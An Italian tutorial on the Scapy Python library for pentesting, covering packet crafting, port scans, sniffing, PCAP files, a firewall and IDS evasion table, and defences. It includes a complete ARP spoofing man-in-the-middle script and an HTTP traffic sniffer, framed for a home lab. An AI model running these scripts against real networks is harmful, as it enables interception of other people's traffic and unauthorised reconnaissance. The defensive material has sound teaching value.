---
title: 'Scapy Python: Packet Crafting, Sniffing e ARP Spoofing '
slug: scapy
description: 'Impara Scapy in Python per il pentest: installazione, packet crafting, sniffer con filtri BPF, SYN scan, analisi PCAP e ARP spoofing con esempi pratici.'
image: /scapy-python-packet-crafting-pentest.webp
draft: false
date: 2026-08-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - Scapy
  - Python
  - Packet Crafting
  - Packet Sniffing
  - ARP Spoofing
  - TCP SYN Scan
  - Firewall Evasion
---

# Scapy: guida completa a Python, packet crafting, sniffing e analisi dei pacchetti

Scapy è una libreria Python che ti fa costruire, inviare, catturare e leggere pacchetti di rete un campo alla volta. Con Scapy in Python scrivi in tre righe quello che con altri strumenti richiede un programma intero: un ping, una scansione di porte, uno sniffer di pacchetti o un attacco ARP in laboratorio.

Questo tutorial Scapy parte dall'installazione di Scapy su Kali Linux, Linux, Windows e macOS e arriva a packet crafting, scansioni, sniffing con filtri BPF, file PCAP, ARP spoofing in laboratorio e difesa. Se vuoi subito provare tutto senza toccare nessuna rete, vai al [laboratorio locale con Scapy](#laboratorio-locale-con-scapy).

***

## Cos'è Scapy e a cosa serve

Scapy è un programma e una libreria Python per la manipolazione dei pacchetti di rete. Il progetto è open source e vive su [GitHub (secdev/scapy)](https://github.com/secdev/scapy). La documentazione Scapy ufficiale è su [scapy.readthedocs.io](https://scapy.readthedocs.io/).

La differenza con gli altri strumenti è una sola: **tu decidi ogni campo del pacchetto**. Nmap sceglie per te i pacchetti, Wireshark li legge e basta. Scapy li costruisce, li manda, legge la risposta e ti lascia il risultato come oggetto Python, pronto da usare in uno script.

Il significato di `packet crafting` è: costruire a mano un pacchetto di rete, campo per campo.

| Strumento                                           | Cosa fa meglio                                                  | Limite                           |
| --------------------------------------------------- | --------------------------------------------------------------- | -------------------------------- |
| Scapy                                               | Pacchetti costruiti a mano, protocolli strani, script su misura | Lento su scansioni grandi        |
| [Nmap](https://hackita.it/articoli/nmap/)           | Scansioni di porte veloci e complete                            | Pacchetti decisi dal programma   |
| [Wireshark](https://hackita.it/articoli/wireshark/) | Analisi visuale di una cattura                                  | Non invia pacchetti              |
| [tcpdump](https://hackita.it/articoli/tcpdump/)     | Cattura veloce da terminale                                     | Non costruisce pacchetti         |
| hping3                                              | Test rapidi con TCP, UDP e ICMP                                 | Meno flessibile, un solo comando |

In un pentest Scapy serve quando gli altri strumenti non bastano: un protocollo che non conosce nessuno, un firewall da testare con pacchetti strani, una rete dove puoi mandare solo un tipo di traffico. Per il contesto generale dello sniffing vedi anche [Sniffing](https://hackita.it/articoli/sniffing/).

***

## Installare Scapy: Kali Linux, Linux, Windows e macOS

L'installazione di Scapy cambia in base al sistema. Dopo l'installazione verifichi sempre con la stessa riga.

**Scapy su Kali Linux (di solito è già incluso, altrimenti):**

```bash
sudo apt update
sudo apt install python3-scapy
```

**Linux con pip (consigliato dentro un ambiente virtuale):**

```bash
python3 -m venv scapy-env
source scapy-env/bin/activate
pip install scapy
```

Su Kali e Debian recenti `pip install` fuori da un ambiente virtuale viene bloccato dal sistema. Per questo si usa `venv` oppure `apt`.

**Windows:** installa prima Npcap da [nmap.org/npcap](https://nmap.org/npcap/), poi Scapy.

```powershell
pip install scapy
```

Npcap è il driver che permette a Scapy di catturare e inviare pacchetti. Senza Npcap lo sniffing non funziona. Se hai già Wireshark, Npcap c'è già.

**macOS:**

```bash
pip3 install scapy
```

**Download di Scapy dal sorgente (GitHub):**

```bash
git clone https://github.com/secdev/scapy.git
cd scapy
pip install .
```

**Verifica dell'installazione:**

```bash
python3 -c "import scapy; print(scapy.__version__)"
```

Se stampa un numero di versione, Scapy è installato. Per avviare la shell interattiva:

```bash
sudo scapy
```

Servono i privilegi di root (su Windows, un terminale avviato come amministratore) perché Scapy scrive pacchetti grezzi sulla scheda di rete.

***

## Scapy in Python: primi comandi

Puoi usare Scapy in due modi: la shell interattiva (`sudo scapy`) per provare, oppure uno script Python con `from scapy.all import *` per automatizzare.

La regola base è una: **i protocolli si impilano con lo slash `/`**, dal livello più basso al più alto.

```python
from scapy.all import IP, TCP

packet = IP(dst="192.168.56.101") / TCP(dport=80, flags="S")
packet.show()
```

Questo è un pacchetto IP con dentro un segmento TCP verso la porta 80, con il flag SYN. Tutti i campi che non scrivi, Scapy li compila con un valore di default.

Comandi che userai di continuo:

| Comando               | Cosa fa                                                       |
| --------------------- | ------------------------------------------------------------- |
| `ls()`                | Elenca tutti i protocolli che Scapy conosce                   |
| `ls(IP)`              | Mostra tutti i campi di un protocollo e i valori di default   |
| `lsc()`               | Elenca tutte le funzioni di Scapy                             |
| `pacchetto.show()`    | Mostra il pacchetto campo per campo                           |
| `pacchetto.show2()`   | Come `show()`, ma con i campi calcolati (checksum, lunghezza) |
| `pacchetto.summary()` | Una riga che riassume il pacchetto                            |
| `hexdump(pacchetto)`  | I byte del pacchetto in esadecimale                           |
| `raw(pacchetto)`      | I byte del pacchetto come oggetto Python                      |

I valori di default sono utili da conoscere. Un `TCP()` senza argomenti ha porta sorgente 20, porta destinazione 80, finestra 8192 e flag S. Lo vedremo anche nella parte difensiva, perché questi valori sono un segnale per chi analizza il traffico.

***

## Livelli (layers) e protocolli di rete in Scapy

Scapy ragiona a strati, come il modello ISO/OSI. Per ogni livello c'è una classe Python.

| Classe         | Livello | Cosa rappresenta                                                                              |
| -------------- | ------- | --------------------------------------------------------------------------------------------- |
| `Ether`        | 2       | Frame Ethernet con MAC sorgente e destinazione                                                |
| `ARP`          | 2/3     | Richieste e risposte ARP                                                                      |
| `IP`           | 3       | Intestazione IPv4 ([IP Internet Protocol](https://hackita.it/articoli/ip-internet-protocol/)) |
| `IPv6`         | 3       | Intestazione IPv6 ([IPv4 e IPv6](https://hackita.it/articoli/ipv4-ipv6/))                     |
| `ICMP`         | 3       | Ping e messaggi di errore ([ICMP](https://hackita.it/articoli/icmp/))                         |
| `TCP`          | 4       | Segmento TCP con flag e numeri di sequenza                                                    |
| `UDP`          | 4       | Datagramma UDP                                                                                |
| `DNS`, `DNSQR` | 7       | Query e risposte DNS ([DNS](https://hackita.it/articoli/dns/))                                |
| `Raw`          | 7       | Dati grezzi (il payload)                                                                      |

Se non scrivi il livello `Ether`, Scapy lo aggiunge da solo con il MAC giusto quando usi le funzioni di livello 3. Se lavori al livello 2 (`sendp`, `srp`) lo scrivi tu.

***

## Packet crafting con Scapy: TCP, UDP, ICMP e DNS

Ecco i pacchetti più usati. Sono solo costruiti, non ancora inviati.

```python
from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, Raw

target = "192.168.56.101"

# TCP SYN to port 443
tcp_syn = IP(dst=target) / TCP(dport=443, flags="S")

# UDP packet with a payload
udp_packet = IP(dst=target) / UDP(sport=4444, dport=5353) / Raw(b"hello")

# ICMP echo request (ping)
ping = IP(dst=target) / ICMP()

# DNS query for the A record of example.com
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
```

La packet manipulation, cioè la modifica di un pacchetto già costruito o catturato, è semplice: per cambiare un campo, basta riscriverlo. Per leggerne uno, usi il nome del livello tra parentesi quadre:

```python
tcp_syn[TCP].dport = 8443
print(tcp_syn[IP].dst)
```

**Inviare una query DNS con Scapy e leggere la risposta:**

```python
from scapy.all import IP, UDP, DNS, DNSQR, sr1

reply = sr1(IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com")), timeout=2, verbose=0)

if reply is not None and reply.haslayer(DNS):
    for answer in reply[DNS].an or []:
        print(answer.rdata)
```

**Flag TCP in Scapy.** Si scrivono come lettere: `S` SYN, `A` ACK, `F` FIN, `R` RST, `P` PSH, `U` URG. Si combinano: `"SA"` è SYN più ACK, `"FPU"` è la combinazione Xmas.

***

## Inviare pacchetti con Scapy: send, sendp, sr, sr1 e srp

Scapy ha quattro funzioni principali per inviare. La scelta dipende da due domande: lavori al livello 2 o al livello 3? Vuoi la risposta?

| Funzione  | Livello | Aspetta la risposta? | Quando si usa                               |
| --------- | ------- | -------------------- | ------------------------------------------- |
| `send()`  | 3       | No                   | Mandare e basta (flood, spoofing)           |
| `sendp()` | 2       | No                   | Mandare con il frame Ethernet scritto da te |
| `sr()`    | 3       | Sì, tutte            | Più pacchetti, più risposte (scansioni)     |
| `sr1()`   | 3       | Sì, la prima         | Un pacchetto, una risposta (ping, DNS)      |
| `srp()`   | 2       | Sì, tutte            | Scansione ARP                               |
| `srp1()`  | 2       | Sì, la prima         | Una richiesta ARP                           |

Esempio con `sr1()`: un ping.

```python
from scapy.all import IP, ICMP, sr1

reply = sr1(IP(dst="192.168.56.101") / ICMP(), timeout=2, verbose=0)

if reply is None:
    print("no reply")
else:
    print(reply.summary())
```

Opzioni utili per tutte le funzioni di invio:

| Opzione        | Significato                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------- |
| `timeout=2`    | Dopo quanti secondi smettere di aspettare. **Mettilo sempre**, altrimenti lo script resta bloccato |
| `verbose=0`    | Niente output di Scapy                                                                             |
| `count=5`      | Manda il pacchetto 5 volte (solo `send`/`sendp`)                                                   |
| `inter=0.5`    | Pausa in secondi tra un pacchetto e l'altro                                                        |
| `iface="eth0"` | Scheda di rete da usare                                                                            |
| `retry=2`      | Quante volte rimandare se non risponde nessuno                                                     |

`sr()` ritorna due liste: i pacchetti con risposta e quelli senza. Ogni elemento della prima è una coppia (inviato, ricevuto):

```python
answered, unanswered = sr(IP(dst="192.168.56.101") / TCP(dport=[22, 80, 443], flags="S"), timeout=2, verbose=0)

for sent, received in answered:
    print(sent[TCP].dport, received[TCP].flags)
```

***

## Ping, traceroute e IPv6 con Scapy

**Ping a una rete intera:**

```python
from scapy.all import IP, ICMP, sr

answered, _ = sr(IP(dst="192.168.56.0/24") / ICMP(), timeout=2, verbose=0)

for sent, received in answered:
    print(received[IP].src, "is up")
```

**Traceroute fatto a mano.** Si manda un pacchetto con TTL 1, poi 2, poi 3. Ogni router che scarta il pacchetto risponde e rivela il proprio indirizzo.

```python
from scapy.all import IP, ICMP, sr1

for ttl in range(1, 15):
    reply = sr1(IP(dst="8.8.8.8", ttl=ttl) / ICMP(), timeout=2, verbose=0)
    if reply is None:
        print(ttl, "*")
        continue
    print(ttl, reply[IP].src)
    if reply[ICMP].type == 0:
        break
```

Scapy ha anche il comando pronto `traceroute("8.8.8.8")`.

**IPv6 e ICMPv6:**

```python
from scapy.all import IPv6, ICMPv6EchoRequest, sr1

reply = sr1(IPv6(dst="::1") / ICMPv6EchoRequest(), timeout=2, verbose=0)
print(reply.summary() if reply else "no reply")
```

***

## Port scanning con Scapy: SYN scan

Il port scanning con Scapy ti fa capire come funziona davvero una scansione. Lo SYN scan manda un SYN e legge cosa torna indietro.

```python
from scapy.all import IP, TCP, sr

target = "192.168.56.101"
ports = [21, 22, 80, 443, 3306, 8080]

answered, _ = sr(IP(dst=target) / TCP(dport=ports, flags="S"), timeout=2, verbose=0)

for sent, received in sorted(answered, key=lambda pair: pair[0][TCP].dport):
    if received.haslayer(TCP) and received[TCP].flags == 0x12:
        print(f"{sent[TCP].dport}/tcp open")
```

Come leggere la risposta:

| Cosa torna       | Significato                                   |
| ---------------- | --------------------------------------------- |
| SYN-ACK (`0x12`) | Porta aperta                                  |
| RST-ACK (`0x14`) | Porta chiusa                                  |
| Niente           | Porta filtrata da un firewall (o host spento) |
| ICMP tipo 3      | Firewall che rifiuta in modo esplicito        |

Altre scansioni si fanno cambiando i flag:

| Scansione | Flag                | Porta chiusa risponde | Porta aperta risponde                        |
| --------- | ------------------- | --------------------- | -------------------------------------------- |
| SYN       | `S`                 | RST                   | SYN-ACK                                      |
| FIN       | `F`                 | RST                   | Niente                                       |
| NULL      | nessuno (`flags=0`) | RST                   | Niente                                       |
| Xmas      | `FPU`               | RST                   | Niente                                       |
| ACK       | `A`                 | RST                   | RST (serve a mappare le regole del firewall) |

FIN, NULL e Xmas funzionano solo su sistemi che seguono alla lettera lo standard (Linux e BSD). Windows risponde RST sempre.

**Un dettaglio che frega tutti.** Scapy manda il SYN, ma il sistema operativo non sa di averlo mandato. Quando arriva il SYN-ACK, il kernel risponde da solo con un RST e chiude la connessione. Per una scansione va bene. Se invece vuoi fare un handshake a mano devi bloccare gli RST del kernel:

```bash
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.56.101 -j DROP
```

Alla fine togli la regola con lo stesso comando, cambiando `-A` in `-D`.

Per scansioni vere usa [Nmap](https://hackita.it/articoli/nmap/): Scapy qui serve per capire e per i casi strani. Per le porte più comuni vedi [Porte TCP e UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest/).

***

## Network scanning con Scapy: scoprire gli host con ARP

Nella stessa rete locale, ARP è il metodo più affidabile per trovare gli host: nessun firewall blocca le richieste ARP, perché senza ARP la rete non funziona.

```python
from scapy.all import Ether, ARP, srp

answered, _ = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"),
    timeout=2,
    verbose=0,
)

for sent, received in answered:
    print(received[ARP].psrc, received[Ether].src)
```

Si manda una richiesta "chi ha questo IP?" in broadcast. Chi risponde è vivo, e ci dà anche il MAC.

***

## Scapy sniff: packet sniffer con Scapy

Lo sniffing con Scapy si fa con la funzione `sniff()`. Cattura i pacchetti dalla scheda di rete e passa ognuno a una tua funzione.

```python
from scapy.all import sniff

def show_packet(packet):
    print(packet.summary())

sniff(iface="eth0", prn=show_packet, count=10)
```

Un packet sniffer in Python (uno sniffer Python) con Scapy in dieci righe. I parametri che contano:

| Parametro | Significato                                                |
| --------- | ---------------------------------------------------------- |
| `iface`   | La scheda di rete da ascoltare                             |
| `prn`     | La funzione da chiamare per ogni pacchetto                 |
| `count`   | Dopo quanti pacchetti fermarsi (0 = mai)                   |
| `timeout` | Dopo quanti secondi fermarsi                               |
| `filter`  | Un filtro BPF, applicato dal kernel (veloce)               |
| `lfilter` | Un filtro Python, applicato da Scapy (lento ma flessibile) |
| `store`   | `False` per non tenere i pacchetti in memoria              |
| `offline` | Legge da un file PCAP invece che dalla rete                |

Metti `store=False` quando lo sniffer gira a lungo, altrimenti la memoria si riempie.

### Scapy sniff con filtri BPF

Il filtro BPF (Berkeley Packet Filter) è lo stesso linguaggio di [tcpdump](https://hackita.it/articoli/tcpdump/). Il filtro lavora dentro il kernel e scarta i pacchetti prima che arrivino a Python.

| Filtro BPF                            | Cosa cattura                |
| ------------------------------------- | --------------------------- |
| `tcp`                                 | Solo TCP                    |
| `udp port 53`                         | Solo DNS                    |
| `host 192.168.56.101`                 | Traffico da e verso un host |
| `src host 192.168.56.101`             | Solo dal host               |
| `tcp port 80 or tcp port 8080`        | Web non cifrato             |
| `icmp`                                | Solo ping                   |
| `arp`                                 | Solo ARP                    |
| `net 192.168.56.0/24 and not port 22` | Una rete, escluso SSH       |
| `tcp[tcpflags] & tcp-syn != 0`        | Solo pacchetti con SYN      |

```python
from scapy.all import sniff

sniff(iface="eth0", filter="tcp port 80", prn=lambda p: p.summary(), count=20)
```

Il filtro BPF richiede libpcap (su Kali c'è già, su Windows lo porta Npcap). Se manca, Scapy ti dà l'errore `libpcap is not available`. In quel caso usa `lfilter`, che funziona sempre.

### Sniffer HTTP e DNS con Scapy

**Sniffer HTTP:** mostra la prima riga delle richieste web in chiaro.

```python
from scapy.all import sniff, TCP, Raw

def show_http_request(packet):
    if Raw in packet:
        first_line = packet[Raw].load.split(b"\r\n")[0]
        if first_line.startswith((b"GET ", b"POST ", b"PUT ")):
            print(packet["IP"].src, "->", packet["IP"].dst, first_line.decode(errors="replace"))

sniff(iface="eth0", filter="tcp port 80", prn=show_http_request, store=False)
```

Vede solo HTTP in chiaro. Il traffico HTTPS è cifrato: vedi gli indirizzi e le dimensioni, non il contenuto.

**Sniffer DNS:** mostra chi chiede quale nome.

```python
from scapy.all import sniff, DNS, DNSQR, IP

def show_dns_query(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        print(packet[IP].src, packet[DNSQR].qname.decode())

sniff(iface="eth0", filter="udp port 53", prn=show_dns_query, store=False)
```

### Sniffing in background con AsyncSniffer

Se devi sniffare e fare altro nello stesso script, usa `AsyncSniffer`: parte in background e lo fermi quando vuoi.

```python
import time
from scapy.all import AsyncSniffer, IP, ICMP, send

sniffer = AsyncSniffer(iface="eth0", filter="icmp")
sniffer.start()
time.sleep(1)
send(IP(dst="192.168.56.101") / ICMP(), verbose=0)
time.sleep(2)
captured = sniffer.stop()
print(len(captured), "packets")
```

***

## File PCAP con Scapy: leggere, scrivere e analizzare

I file PCAP sono il formato di cattura che usano tcpdump e [Wireshark](https://hackita.it/articoli/wireshark/). Con Scapy li scrivi e li leggi in una riga.

```python
from scapy.all import sniff, wrpcap, rdpcap, TCP

# Capture 100 packets and save them
packets = sniff(iface="eth0", count=100)
wrpcap("capture.pcap", packets)

# Read a capture back
packets = rdpcap("capture.pcap")
print(len(packets), "packets")
packets[0].show()

# Filter the capture in Python
syn_packets = [p for p in packets if TCP in p and p[TCP].flags == "S"]
print(len(syn_packets), "SYN packets")
```

Per file grandi, `rdpcap()` carica tutto in memoria. Meglio leggere un pacchetto alla volta:

```python
from scapy.all import PcapReader

with PcapReader("capture.pcap") as reader:
    for packet in reader:
        print(packet.summary())
```

Con `sniff(offline="capture.pcap", prn=...)` rilanci su una cattura la stessa funzione che usi dal vivo. Dopo, apri il file in Wireshark per guardarlo bene. Se hai [TShark](https://hackita.it/articoli/tshark/) puoi fare riassunti veloci dal terminale.

Una cosa da sapere: se catturi su `lo` (loopback) ogni pacchetto compare due volte, perché Linux lo mostra in uscita e in entrata.

***

## ARP spoofing e MITM con Scapy in laboratorio

L'ARP spoofing sfrutta un difetto di ARP: nessuno controlla chi risponde. Un attaccante dice alla vittima "il gateway sono io" e al gateway "la vittima sono io". Da lì tutto il traffico passa da lui. Il risultato è un [Man in the Middle](https://hackita.it/articoli/man-in-the-middle/).

Usalo **solo in un laboratorio tuo** (due macchine virtuali in una rete host-only, per esempio). Su una rete altrui è illegale, e un errore può togliere la rete a tutti.

Prima abiliti il forwarding, così la vittima continua a navigare:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Poi lo script. Gli IP sono quelli di una rete host-only tipica: vittima `192.168.56.101`, gateway `192.168.56.1`.

```python
import time
from scapy.all import ARP, Ether, getmacbyip, sendp

VICTIM_IP = "192.168.56.101"
GATEWAY_IP = "192.168.56.1"
IFACE = "eth1"

victim_mac = getmacbyip(VICTIM_IP)
gateway_mac = getmacbyip(GATEWAY_IP)

if victim_mac is None or gateway_mac is None:
    raise SystemExit("cannot resolve MAC addresses, check IFACE and the lab network")


def poison():
    # Tell the victim that the gateway IP is at our MAC
    sendp(Ether(dst=victim_mac) / ARP(op=2, psrc=GATEWAY_IP, pdst=VICTIM_IP, hwdst=victim_mac), iface=IFACE, verbose=0)
    # Tell the gateway that the victim IP is at our MAC
    sendp(Ether(dst=gateway_mac) / ARP(op=2, psrc=VICTIM_IP, pdst=GATEWAY_IP, hwdst=gateway_mac), iface=IFACE, verbose=0)


def restore():
    # Send the real MAC addresses back, several times to be sure
    sendp(Ether(dst=victim_mac) / ARP(op=2, psrc=GATEWAY_IP, hwsrc=gateway_mac, pdst=VICTIM_IP, hwdst=victim_mac), iface=IFACE, count=5, verbose=0)
    sendp(Ether(dst=gateway_mac) / ARP(op=2, psrc=VICTIM_IP, hwsrc=victim_mac, pdst=GATEWAY_IP, hwdst=gateway_mac), iface=IFACE, count=5, verbose=0)


try:
    while True:
        poison()
        time.sleep(2)
except KeyboardInterrupt:
    restore()
    print("ARP tables restored")
```

Cosa succede: `op=2` è una risposta ARP (is-at) mandata senza che nessuno l'abbia chiesta. Il campo `hwsrc` non lo scrivi, quindi Scapy usa il MAC della tua scheda: è quello che fa l'inganno. Ripeti ogni due secondi perché le voci ARP scadono.

Per vedere l'effetto sulla vittima: `ip neigh` (Linux) o `arp -a` (Windows). Il MAC del gateway diventa il tuo. Mentre il MITM è attivo, in un'altra finestra puoi usare lo sniffer HTTP visto sopra. Altri strumenti per questo attacco e le sue varianti sono in [Man in the Middle](https://hackita.it/articoli/man-in-the-middle/).

***

## Scapy per testare firewall e IDS

Scapy è utile per capire come reagisce una difesa a pacchetti fuori dal normale. Ogni test è un campo cambiato.

| Test                  | Pacchetto                          | Cosa verifichi                                         |
| --------------------- | ---------------------------------- | ------------------------------------------------------ |
| Flag anomali          | `TCP(flags="FPU")` (Xmas)          | Se il firewall e l'IDS vedono scansioni "silenziose"   |
| TTL basso             | `IP(ttl=1)`                        | Se un router risponde con ICMP tipo 11                 |
| Frammentazione        | `fragment(pacchetto, fragsize=24)` | Se l'IDS ricostruisce i frammenti prima di analizzarli |
| Porta sorgente fissa  | `TCP(sport=53, dport=80)`          | Se il firewall si fida del traffico che "sembra" DNS   |
| Pacchetti senza stato | ACK senza SYN                      | Se il firewall è stateful                              |

Esempio con frammentazione:

```python
from scapy.all import IP, ICMP, Raw, fragment, send

fragments = fragment(IP(dst="192.168.56.101") / ICMP() / Raw(b"A" * 64), fragsize=24)
print(len(fragments), "fragments")
send(fragments, verbose=0)
```

Se la tua scansione compare nei log dell'IDS, sai già cosa rileva. Se non compare, hai trovato un buco da segnalare nel report.

***

## Comandi Scapy ed esempi: cheat sheet

| Cosa vuoi fare                  | Comando                                                                      |
| ------------------------------- | ---------------------------------------------------------------------------- |
| Avviare la shell                | `sudo scapy`                                                                 |
| Vedere i campi di un protocollo | `ls(TCP)`                                                                    |
| Ping                            | `sr1(IP(dst="192.168.56.101")/ICMP(), timeout=2)`                            |
| SYN scan                        | `sr(IP(dst="192.168.56.101")/TCP(dport=[22,80,443], flags="S"), timeout=2)`  |
| Scansione ARP                   | `srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.56.0/24"), timeout=2)` |
| Sniffare 10 pacchetti           | `sniff(iface="eth0", count=10)`                                              |
| Sniffare con filtro BPF         | `sniff(filter="tcp port 80", prn=lambda p: p.summary())`                     |
| Salvare una cattura             | `wrpcap("capture.pcap", packets)`                                            |
| Leggere una cattura             | `rdpcap("capture.pcap")`                                                     |
| Aprire in Wireshark             | `wireshark(packets)`                                                         |
| Traceroute                      | `traceroute("8.8.8.8")`                                                      |
| Frammentare                     | `fragment(pacchetto, fragsize=24)`                                           |
| Hexdump                         | `hexdump(pacchetto)`                                                         |
| Costruire da byte               | `IP(raw_bytes)`                                                              |

***

## Errori comuni e troubleshooting

| Problema                                 | Causa                                         | Soluzione                                                            |
| ---------------------------------------- | --------------------------------------------- | -------------------------------------------------------------------- |
| `Operation not permitted`                | Non sei root                                  | `sudo` (Linux, macOS) o terminale amministratore (Windows)           |
| `sr1()` ritorna `None`                   | Host spento, firewall, o timeout troppo corto | Prova un ping normale, alza `timeout`                                |
| `WARNING: No route found`                | Scapy non trova la strada verso l'IP          | Controlla `conf.route` e l'IP di destinazione                        |
| `libpcap is not available`               | Manca libpcap, il filtro BPF non funziona     | Installa libpcap o tcpdump; oppure usa `lfilter`                     |
| Sniffing vuoto su Windows                | Npcap non installato                          | Installa Npcap da nmap.org/npcap                                     |
| Sniffer Wi-Fi vuoto                      | La scheda non è in monitor mode               | Metti la scheda in monitor mode e usa `monitor=True` dove supportato |
| Ogni pacchetto compare due volte         | Stai sniffando `lo`                           | È normale: uscita e entrata                                          |
| `externally-managed-environment` con pip | Python protetto dal sistema                   | Usa `venv` oppure `apt install python3-scapy`                        |
| Lo scan è molto lento                    | Scapy è scritto in Python                     | Per scansioni grandi usa Nmap                                        |
| La connessione si chiude dopo il SYN-ACK | Il kernel manda un RST                        | Regola iptables vista sopra                                          |
| L'attacco ARP non funziona               | Switch con protezioni                         | Vedi Dynamic ARP Inspection nella parte difensiva                    |

Per capire se un pacchetto è stato costruito bene, `show2()` calcola checksum e lunghezze come li calcolerebbe la rete, e confrontarlo con una cattura in Wireshark risolve quasi sempre il dubbio.

***

## Laboratorio locale con Scapy

Questo laboratorio gira tutto su `127.0.0.1`: non tocca nessuna rete e puoi lanciarlo ovunque. Crea un piccolo server web, poi con Scapy fa un ping, una scansione SYN di quattro porte, sniffa la richiesta HTTP e salva la cattura in un PCAP.

Salvalo come `lab_scapy.py` e avvialo con `sudo python3 lab_scapy.py`:

```python
#!/usr/bin/env python3
# Local Scapy lab: everything stays on 127.0.0.1, run with sudo
import threading
import time
import http.server
import urllib.request
from scapy.all import IP, TCP, ICMP, Raw, sr, sr1, AsyncSniffer, wrpcap, rdpcap, conf

conf.verb = 0
TARGET = "127.0.0.1"
LAB_PORT = 8080


class QuietHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"lab ok")

    def log_message(self, *args):
        pass


server = http.server.ThreadingHTTPServer((TARGET, LAB_PORT), QuietHandler)
threading.Thread(target=server.serve_forever, daemon=True).start()

# 1) ICMP ping
reply = sr1(IP(dst=TARGET) / ICMP(), timeout=2)
print("ping:", "alive" if reply is not None and reply[ICMP].type == 0 else "no reply")

# 2) SYN scan on a few ports
ports = [22, 80, 8080, 8081]
answered, _ = sr(IP(dst=TARGET) / TCP(dport=ports, flags="S"), timeout=2)
for sent, received in sorted(answered, key=lambda pair: pair[0][TCP].dport):
    state = "open" if received[TCP].flags == 0x12 else "closed"
    print(f"scan: {sent[TCP].dport}/tcp {state}")

# 3) sniff the HTTP request made by urllib
captured = []
sniffer = AsyncSniffer(
    iface="lo",
    lfilter=lambda p: TCP in p and p[TCP].dport == LAB_PORT and Raw in p,
    prn=captured.append,
    store=False,
)
sniffer.start()
time.sleep(1)
urllib.request.urlopen(f"http://{TARGET}:{LAB_PORT}/test").read()
time.sleep(1)
sniffer.stop()
print("sniff:", captured[0][Raw].load.split(b"\r\n")[0].decode())

# 4) save to pcap and read it back
wrpcap("lab.pcap", captured)
print("pcap packets:", len(rdpcap("lab.pcap")))
server.shutdown()
```

Output atteso:

```text
ping: alive
scan: 22/tcp closed
scan: 80/tcp closed
scan: 8080/tcp open
scan: 8081/tcp closed
sniff: GET /test HTTP/1.1
pcap packets: 2
```

Le porte 22, 80 e 8081 sono chiuse perché non c'è nessun servizio. La 8080 è aperta perché ci sta il server del laboratorio. I pacchetti nel PCAP sono due perché su `lo` ogni pacchetto si vede in uscita e in entrata. Apri `lab.pcap` in Wireshark per vedere la richiesta con i tuoi occhi.

***

## Come difendersi dagli attacchi fatti con Scapy

Scapy è solo uno strumento: le difese valgono contro qualunque programma che manda gli stessi pacchetti.

**1. ARP spoofing: blocca la causa sullo switch.** Dynamic ARP Inspection controlla ogni risposta ARP contro la tabella del DHCP snooping e scarta quelle false.

```text
ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10

interface GigabitEthernet1/0/24
 ip dhcp snooping trust
 ip arp inspection trust
```

Le porte verso gli utenti restano non fidate, quelle verso router e altri switch diventano fidate. In più, `port-security` limita quanti MAC può avere ogni porta, e le [VLAN](https://hackita.it/articoli/vlan/) separano chi non deve parlare. Sui server importanti puoi anche fissare il MAC del gateway a mano:

```bash
sudo ip neigh replace 192.168.56.1 lladdr 02:00:00:00:00:01 dev eth0 nud permanent
```

Cambia il MAC con quello vero del tuo gateway.

**2. ARP spoofing: scoprilo con uno script.** Questo monitor ricorda quale MAC corrisponde a ogni IP e avvisa quando cambia. Funziona dal vivo o su un PCAP:

```python
from scapy.all import sniff, ARP

known = {}


def check_arp(packet):
    if ARP in packet and packet[ARP].op == 2:
        ip, mac = packet[ARP].psrc, packet[ARP].hwsrc
        if ip in known and known[ip] != mac:
            print(f"ALERT {ip} changed from {known[ip]} to {mac}")
        known.setdefault(ip, mac)


sniff(iface="eth0", filter="arp", prn=check_arp, store=False)
```

Provato su un PCAP con due risposte ARP per lo stesso IP e MAC diversi: stampa l'alert. In produzione usa `arpwatch`, che fa lo stesso lavoro e mantiene lo storico.

**3. Scansioni di porte: regola per l'IDS.** Questa regola Suricata segnala chi manda molti SYN in pochi secondi:

```text
alert tcp any any -> $HOME_NET any (msg:"Possible SYN scan"; flags:S; threshold:type both, track by_src, count 30, seconds 5; sid:1000001; rev:1;)
```

**4. Pacchetti che sembrano di Scapy.** Un `TCP()` lasciato ai default ha porta sorgente 20, finestra 8192 e porta destinazione 80. Un SYN che arriva da porta 20 con finestra 8192 non è un client normale. Non è una prova (chi usa Scapy può cambiare tutto), ma è un buon segnale da guardare nei log del firewall o in una cattura.

**5. Altre regole di base.**

* Filtra in ingresso i pacchetti con TTL anomalo, flag impossibili (SYN+FIN, NULL, Xmas) e frammenti troppo piccoli.
* Fai in modo che il firewall sia stateful: ACK e FIN senza una connessione prima devono essere scartati.
* Fai ricomporre i frammenti all'IDS prima di analizzarli.
* Usa 802.1X per tenere fuori dalla rete chi non è autorizzato: se la porta non si apre, nessuno può mandare un ARP.
* Cifra il traffico (HTTPS, SSH, VPN): anche in caso di MITM l'attaccante vede solo dati cifrati.
* Tieni un sensore con [tcpdump](https://hackita.it/articoli/tcpdump/) o [Wireshark](https://hackita.it/articoli/wireshark/) sulle reti sensibili per avere una cattura da analizzare dopo un incidente.

Usa Scapy solo su reti e sistemi per cui hai un'autorizzazione scritta: mandare pacchetti falsificati senza permesso è reato in quasi tutti i Paesi.

***

## FAQ

**Cos'è Scapy?** È una libreria Python per costruire, inviare, catturare e analizzare pacchetti di rete.

**A cosa serve Scapy?** Serve per packet crafting, sniffing, scansioni, test di firewall e IDS, analisi di file PCAP e per studiare i protocolli di rete.

**Come si installa Scapy?** Su Kali con `sudo apt install python3-scapy`, su Linux e macOS con `pip install scapy` (meglio dentro un ambiente virtuale). Su Windows installa prima Npcap, poi `pip install scapy`.

